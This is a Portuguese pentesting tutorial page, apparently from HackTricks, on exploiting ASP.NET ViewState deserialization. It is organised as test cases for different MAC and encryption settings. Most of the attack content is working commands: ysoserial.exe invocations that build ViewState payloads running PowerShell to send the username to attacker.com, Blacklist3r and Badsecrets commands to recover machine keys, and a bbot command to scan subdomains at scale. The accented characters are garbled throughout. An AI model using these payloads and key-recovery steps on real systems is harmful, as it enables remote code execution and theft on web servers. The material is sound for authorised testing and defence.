# Explorando \_\_VIEWSTATE sem conhecer os segredos

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de ciberseguran√ßa**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? Ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Se voc√™ est√° interessado em uma **carreira de hacking** e hackear o inquebr√°vel - **estamos contratando!** (_flu√™ncia em polon√™s escrita e falada √© necess√°ria_).

{% embed url="https://www.stmcyber.com/careers" %}

## O que √© ViewState

**ViewState** √© o m√©todo que o framework ASP.NET usa por padr√£o para p**reservar valores de p√°gina e controle entre p√°ginas da web**. Quando o HTML da p√°gina √© renderizado, o estado atual da p√°gina e os valores que precisam ser mantidos durante o postback s√£o serializados em strings codificadas em base64 e exibidos no campo oculto ViewState ou nos campos.\
As seguintes propriedades ou combina√ß√£o de propriedades se aplicam √†s informa√ß√µes do ViewState:

* Base64
* Pode ser definido usando o atributo EnableViewStateMac e ViewStateEncryptionMode definido como false
* Base64 + MAC (Message Authentication Code) habilitado
* Pode ser definido usando o atributo EnableViewStateMac definido como true
* Base64 + Criptografado
* Pode ser definido usando o atributo viewStateEncryptionMode definido como true

## **Casos de Teste**

![](<../../.gitbook/assets/image (309) (2).png>)

### Caso de Teste: 1 ‚Äì EnableViewStateMac=false e viewStateEncryptionMode=false

Tamb√©m √© poss√≠vel desabilitar completamente o ViewStateMAC definindo a chave de registro `AspNetEnforceViewStateMac` como zero em:
```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\v{VersionHere}
```
**Identificando Atributos do ViewState**

Voc√™ pode tentar identificar se o ViewState est√° protegido por MAC capturando uma solicita√ß√£o contendo esse par√¢metro com o BurpSuite:

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/1.0.png)

Se o MAC n√£o for usado para proteger o par√¢metro, voc√™ pode explor√°-lo usando o [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net).
```
ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName"
```
### Caso de teste 1.5 - Como o caso de teste 1, mas o cookie ViewState n√£o √© enviado pelo servidor

Os desenvolvedores podem **remover o ViewState** para que ele n√£o fa√ßa parte de uma solicita√ß√£o HTTP (o usu√°rio n√£o receber√° esse cookie).\
Pode-se assumir que, se o **ViewState** n√£o estiver presente, a implementa√ß√£o estar√° **segura** contra poss√≠veis vulnerabilidades relacionadas √† desserializa√ß√£o do ViewState.\
No entanto, esse n√£o √© o caso. Se adicionarmos o par√¢metro **ViewState** ao corpo da solicita√ß√£o e enviarmos nossa carga √∫til serializada criada usando o ysoserial, ainda poderemos obter **execu√ß√£o de c√≥digo**, como mostrado no **Caso 1**.

### Caso de Teste: 2 - .Net < 4.5 e EnableViewStateMac=true & ViewStateEncryptionMode=false

Para **habilitar o MAC do ViewState** para uma **p√°gina espec√≠fica**, precisamos fazer as seguintes altera√ß√µes em um arquivo aspx espec√≠fico:
```bash
<%@ Page Language="C#" AutoEventWireup="true" CodeFile="hello.aspx.cs" Inherits="hello" enableViewStateMac="True"%>
```
Tamb√©m podemos fazer isso para a aplica√ß√£o **como um todo** configurando no arquivo **web.config**, conforme mostrado abaixo:
```markup
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
<system.web>
<customErrors mode="Off" />
<machineKey validation="SHA1" validationKey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45" />
<pages enableViewStateMac="true" />
</system.web>
</configuration>
```
Como o par√¢metro est√° protegido por MAC desta vez, para executar com sucesso o ataque, primeiro precisamos obter a chave utilizada. Neste caso, o BurpSuite nos informar√° que o par√¢metro est√° protegido por MAC:

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/2.0.png)

Voc√™ pode tentar usar [**Blacklist3r(AspDotNetWrapper.exe)**](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper) para encontrar a chave utilizada.
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --decrypt --purpose=viewstate --modifier=6811C9FF --macdecode --TargetPagePath "/Savings-and-Investments/Application/ContactDetails.aspx" -f out.txt --IISDirPath="/"

--encrypteddata : __VIEWSTATE parameter value of the target application
--modifier : __VIWESTATEGENERATOR parameter value
```
![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/2.1.png)

[**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets) √© outra ferramenta que pode identificar machineKeys conhecidos. √â escrita em Python, ent√£o, ao contr√°rio do Blacklist3r, n√£o h√° depend√™ncia do Windows. Para viewstates .NET, h√° um utilit√°rio "python blacklist3r", que √© a maneira mais r√°pida de us√°-lo.

Ele pode ser fornecido diretamente com o viewstate e o gerador:
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --viewstate /wEPDwUJODExMDE5NzY5ZGQMKS6jehX5HkJgXxrPh09vumNTKQ== --generator EDD8C9AE
```
Ou, ele pode se conectar diretamente √† URL de destino e tentar extrair o viewstate do HTML:
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --url http://vulnerablesite/vulnerablepage.aspx
```
![](https://user-images.githubusercontent.com/24899338/227034654-e8ad9648-6c0e-47cb-a873-bf97623a0089.png)

Para buscar viewstates vulner√°veis em escala, em conjunto com a enumera√ß√£o de subdom√≠nios, o m√≥dulo `badsecrets` do [**BBOT**](exploiting-\_\_viewstate-parameter.md) pode ser usado:
```
bbot -f subdomain-enum -m badsecrets -t evil.corp
```
Se voc√™ tiver sorte e encontrar a chave, voc√™ pode prosseguir com o ataque usando [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)**:**
```
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --generator=CA0B0334 --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"

--generator = {__VIWESTATEGENERATOR parameter value}
```
Nos casos em que o par√¢metro `_VIEWSTATEGENERATOR` **n√£o √© enviado** pelo servidor, voc√™ **n√£o precisa** fornecer o par√¢metro `--generator`, mas **estes** s√£o necess√°rios:
```bash
--apppath="/" --path="/hello.aspx"
```
### Caso de teste: 3 - .Net < 4.5 e EnableViewStateMac=true/false e ViewStateEncryptionMode=true

Neste caso, o Burp n√£o consegue identificar se o par√¢metro est√° protegido com MAC porque n√£o reconhece os valores. Portanto, o valor provavelmente est√° criptografado e voc√™ **precisar√° da Machine Key para criptografar sua carga √∫til** e explorar a vulnerabilidade.

![](https://notsosecure.com/sites/all/assets/group/nss_uploads/2019/06/3.0.png)

**Neste caso, o m√≥dulo** [**Blacklist3r**](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper) **est√° em desenvolvimento...**

Antes do .NET 4.5, o ASP.NET pode **aceitar** um par√¢metro \_`__VIEWSTATE`\_ **n√£o criptografado** dos usu√°rios, mesmo que o **`ViewStateEncryptionMode`** tenha sido definido como _**Always**_. O ASP.NET **apenas verifica** a **presen√ßa** do par√¢metro **`__VIEWSTATEENCRYPTED`** na solicita√ß√£o. **Se esse par√¢metro for removido e a carga √∫til n√£o criptografada for enviada, ela ainda ser√° processada.**

Portanto, se a Machine Key for conhecida (por exemplo, por meio de um problema de travessia de diret√≥rio), o comando [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net) usado no **Caso 2** pode ser usado para executar RCE usando a vulnerabilidade de deserializa√ß√£o do ViewState.

* Remova o par√¢metro `__VIEWSTATEENCRYPTED` da solicita√ß√£o para explorar a vulnerabilidade de deserializa√ß√£o do ViewState, caso contr√°rio, ocorrer√° um erro de valida√ß√£o do MAC do ViewState e a explora√ß√£o falhar√°, como mostrado na figura:

![](https://notsosecure.com/sites/all/assets/group/nss_uploads/2019/06/3.1.png)

### Caso de teste: 4 - .Net >= 4.5 e EnableViewStateMac=true/false e ViewStateEncryptionMode=true/false, exceto ambos os atributos definidos como false

Podemos for√ßar o uso do framework ASP.NET especificando o par√¢metro abaixo dentro do arquivo web.config, conforme mostrado abaixo.
```markup
<httpRuntime targetFramework="4.5" />
```
Alternativamente, isso pode ser feito especificando a op√ß√£o abaixo dentro do par√¢metro `machineKey` do arquivo web.config.
```bash
compatibilityMode="Framework45"
```
Como no caso anterior, o Burp n√£o identifica se a solicita√ß√£o est√° protegida por MAC porque o valor est√° criptografado. Portanto, para enviar uma carga √∫til v√°lida, o atacante precisa da chave.

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/4.0.png)

Voc√™ pode tentar usar [**Blacklist3r(AspDotNetWrapper.exe)**](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper) para encontrar a chave sendo usada:
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata bcZW2sn9CbYxU47LwhBs1fyLvTQu6BktfcwTicOfagaKXho90yGLlA0HrdGOH6x/SUsjRGY0CCpvgM2uR3ba1s6humGhHFyr/gz+EP0fbrlBEAFOrq5S8vMknE/ZQ/8NNyWLwg== --decrypt --purpose=viewstate  --valalgo=sha1 --decalgo=aes --IISDirPath "/" --TargetPagePath "/Content/default.aspx"

--encrypteddata = {__VIEWSTATE parameter value}
--IISDirPath = {Directory path of website in IIS}
--TargetPagePath = {Target page path in application}
```
Para uma descri√ß√£o mais detalhada de IISDirPath e TargetPagePath [consulte aqui](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/4.1.png)

Ou, com [**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets) (com um valor gerado):
```
cd badsecrets
python examples/blacklist3r.py --viewstate JLFYOOegbdXmPjQou22oT2IxUwCAzSA9EAxD6+305e/4MQG7G1v5GI3wL7D94W2OGpVGrI2LCqEwDoS/8JkE0rR4ak0= --generator B2774415
```
Uma vez identificada uma chave de m√°quina v√°lida, **o pr√≥ximo passo √© gerar uma carga √∫til serializada usando** [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)
```
ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --path="/content/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="F6722806843145965513817CEBDECBB1F94808E4A6C0B2F2"  --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"
```
Se voc√™ tiver o valor de `__VIEWSTATEGENERATOR`, voc√™ pode tentar **usar** o par√¢metro `--generator` com esse valor e **omitir** os par√¢metros `--path` e `--apppath`

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/4.2.png)

Se a vulnerabilidade de deserializa√ß√£o do ViewState for explorada com sucesso, um servidor controlado pelo atacante receber√° uma solicita√ß√£o fora de banda contendo o nome de usu√°rio. [PoC de Explora√ß√£o Bem-Sucedida](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/#PoC)

### Caso de Teste 6 - ViewStateUserKeys est√° sendo usado

A propriedade **ViewStateUserKey** pode ser usada para **defender** contra um **ataque CSRF**. Se uma chave desse tipo tiver sido definida na aplica√ß√£o e tentarmos gerar a carga √∫til do **ViewState** com os m√©todos discutidos at√© agora, a **carga √∫til n√£o ser√° processada pela aplica√ß√£o**.\
Voc√™ precisa usar mais um par√¢metro para criar corretamente a carga √∫til:
```bash
--viewstateuserkey="randomstringdefinedintheserver"
```
### Resultado de uma Explora√ß√£o Bem-sucedida <a href="#poc" id="poc"></a>

Para todos os casos de teste, se o payload ViewState YSoSerial.Net funcionar **com sucesso**, o servidor responde com "Erro interno do servidor 500" com o conte√∫do de resposta "As informa√ß√µes de estado s√£o inv√°lidas para esta p√°gina e podem estar corrompidas" e obtemos a solicita√ß√£o OOB conforme mostrado nas Figuras abaixo:

![](https://notsosecure.com/sites/all/assets/group/nss_uploads/2019/06/5.0POC-of-Seccuessful-exploitation.png)

solicita√ß√£o fora de banda com o nome de usu√°rio atual

![](https://notsosecure.com/sites/all/assets/group/nss_uploads/2019/06/5.1POC-of-Seccuessful-exploitation.png)

## Refer√™ncias

* [**https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/**](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/)
* [**https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817**](https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817)\\
* [**https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/**](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)
* [**https://blog.blacklanternsecurity.com/p/introducing-badsecrets**](https://blog.blacklanternsecurity.com/p/introducing-badsecrets)

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Se voc√™ est√° interessado em uma **carreira de hacking** e hackear o inquebr√°vel - **estamos contratando!** (_flu√™ncia em polon√™s, escrita e falada, √© necess√°ria_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de ciberseguran√ßa**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? Ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo Telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
